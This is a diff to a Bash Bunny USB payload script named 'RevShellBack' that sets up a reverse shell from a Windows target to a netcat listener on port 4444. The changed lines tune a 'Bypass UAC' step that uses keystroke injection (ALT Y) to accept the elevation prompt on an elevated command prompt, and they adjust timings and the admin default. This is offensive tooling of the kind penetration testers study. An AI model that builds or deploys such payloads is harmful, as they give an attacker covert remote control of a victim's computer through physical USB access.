@@ -3,7 +3,7 @@
 # Title:         RevShellBack
 # Description:   Set up a reverse shell and execute powershell/generic commands in the background from the Bash Bunny via USB ethernet.
 # Author:        NodePoint
-# Version:       0.1
+# Version:       0.1.1
 # Category:      Execution
 # Target:        Windows
 # Attackmodes:   Ethernet, HID
@@ -19,7 +19,7 @@ GET TARGET_HOSTNAME
 NCPORT=4444
 # Delay before attempting to connect to the netcat listener (ms)
 NCDELAY=200
-ADMIN=true
+ADMIN=false
 
 # Setup networking
 echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -32,14 +32,13 @@ if [ "$ADMIN" = true ] ; then
     # Bypass UAC
     RUN WIN powershell -c "Start-Process cmd -verb runas"
     Q DELAY 1500
-    Q LEFTARROW
-    Q DELAY 500
-    Q ENTER
+    Q ALT Y
+    Q DELAY 300
 else
     # Run as normal user
     RUN WIN powershell -c "Start-Process cmd"
+    Q DELAY 200
 fi
-Q DELAY 400
 
 # Hide CMD
 LED STAGE2
